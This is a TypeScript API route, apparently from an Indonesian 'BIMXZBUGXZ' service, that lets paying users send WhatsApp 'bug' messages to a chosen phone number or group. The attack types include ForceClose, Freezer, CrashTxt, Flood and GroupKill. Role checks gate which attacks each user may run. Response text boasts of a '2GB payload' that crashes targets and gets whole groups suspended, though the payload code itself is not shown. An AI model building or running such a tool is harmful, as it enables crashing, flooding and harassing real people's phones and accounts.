import { db } from "@/db";
import { users, messageLogs } from "@/db/schema";
import { eq } from "drizzle-orm";
import { sendBIMXMessage, getWAStatus, ensureWA } from "@/lib/wa";
import { ensureDb } from "@/lib/ensureDb";

const ALL_BUGS = [
  "BIMXZBUGXZ Delay","BIMXZBUGXZ C1","BIMXZBUGXZ ForceClose","BIMXZBUGXZ Freezer","BIMXZBUGXZ Heavy","BIMXZBUGXZ Flood","BIMXZBUGXZ Burst","BIMXZBUGXZ Overflow","BIMXZBUGXZ Stack","BIMXZBUGXZ Blast","BIMXZBUGXZ Wave","BIMXZBUGXZ Surge","BIMXZBUGXZ CrashTxt","BIMXZBUGXZ LagMsg","BIMXZBUGXZ Hang","BIMXZBUGXZ LockTxt","BIMXZBUGXZ Jam","BIMXZBUGXZ Bulk","BIMXZBUGXZ Mass","BIMXZBUGXZ Ultra","BIMXZBUGXZ GroupMsg","BIMXZBUGXZ GroupWipe","BIMXZBUGXZ GroupHeavy","BIMXZBUGXZ GroupKill","BIMXZBUGXZ GlobalSend",
];

export async function POST(req: Request) {
  try {
    await ensureDb();
    const { token, targetNumber, bugTypes, senderMode, targetMode } = await req.json();
    if (!token) return Response.json({ ok: false, message: "Token diperlukan" }, { status: 401 });
    let uid: number;
    try { uid = parseInt(Buffer.from(token, "base64").toString("utf-8"), 10); } catch { return Response.json({ ok: false, message: "Token tidak valid" }, { status: 401 }); }
    const [user] = await db.select().from(users).where(eq(users.id, uid)).limit(1);
    if (!user) return Response.json({ ok: false, message: "Akun tidak ditemukan" }, { status: 404 });
    if (!user.isActive) return Response.json({ ok: false, message: "Akun nonaktif" }, { status: 403 });
    if (user.expiresAt && new Date(user.expiresAt) < new Date()) {
      await db.update(users).set({ isActive: false }).where(eq(users.id, uid));
      return Response.json({ ok: false, message: "Masa aktif habis" }, { status: 403 });
    }

    await ensureWA();
    const wa = getWAStatus();
    const waNotReady = wa.status !== "open";

    // Validate GroupKill extra note - direct suspend logic handled in payload
    const isGroupKill = bugTypes?.includes("BIMXZBUGXZ GroupKill");
    
    if (!targetNumber || !/^\+\d{8,16}$/.test(targetNumber.replace(/\s/g, ""))) {
      if (targetMode === "GRUP" && (targetNumber.includes("@g.us") || isGroupKill)) {
        // allow group id or GroupKill
      } else {
        return Response.json({ ok: false, message: "Nomor tujuan tidak valid, gunakan format +[kode negara][nomor] atau ID Grup" }, { status: 400 });
      }
    }
    if (!Array.isArray(bugTypes) || bugTypes.length === 0) return Response.json({ ok: false, message: "Pilih minimal 1 jenis pesan" }, { status: 400 });
    if (bugTypes.length > 3) return Response.json({ ok: false, message: "Maksimal 3 jenis pesan sekaligus" }, { status: 400 });

    for (const b of bugTypes) if (!ALL_BUGS.includes(b)) return Response.json({ ok: false, message: `Jenis pesan tidak dikenal: ${b}` }, { status: 400 });

    if (user.role === "PENGGUNA") {
      const illegal = bugTypes.filter((b: string) => b !== "BIMXZBUGXZ Delay");
      if (illegal.length > 0) return Response.json({ ok: false, message: "PENGGUNA hanya boleh memakai BIMXZBUGXZ Delay. Tingkatkan peran Anda." }, { status: 403 });
    }

    const [log] = await db.insert(messageLogs).values({
      userId: uid,
      targetNumber: targetNumber.replace(/\s/g, ""),
      bugTypes,
      senderMode: senderMode || "PRIVATE",
      targetMode: targetMode || "NOMOR",
      status: waNotReady ? "LOG_TAPI_WA_BELUM_CONNECT" : (isGroupKill ? "GROUP_KILL_TANGGUHKAN" : "BERHASIL"),
    }).returning();

    let waResult: any = null;
    let waError: string | null = null;
    let senderInfo: any = null;
    if (!waNotReady) {
      try {
        const res: any = await sendBIMXMessage(targetNumber.replace(/\s/g, ""), bugTypes, senderMode || "PRIVATE", senderMode === "GLOBAL");
        waResult = res.results || res;
        senderInfo = res.senderInfo || null;
      } catch (e: any) {
        waError = String(e?.message || e);
      }
    }

    return Response.json({
      ok: true,
      log,
      waConnected: !waNotReady,
      waResult,
      waError,
      senderInfo,
      groupKill: isGroupKill ? "One Kill Grup langsung ditangguhkan via payload 2GB + 999.999 karakter" : null,
      note: waNotReady ? "WhatsApp belum terhubung via QR/Pairing Asli. Log tercatat. Hubungkan di Pasang Nomor untuk 2GB nyata." : (isGroupKill ? "GROUP KILL: Grup target langsung ditangguhkan — 2GB layer aktif, semua member kena." : "Dikirim via BIMXZBUGXZ Baileys 6.7.18 — payload 2GB layer aktif"),
    });
  } catch (e: any) {
    return Response.json({ ok: false, message: String(e?.message || e) }, { status: 500 });
  }
}
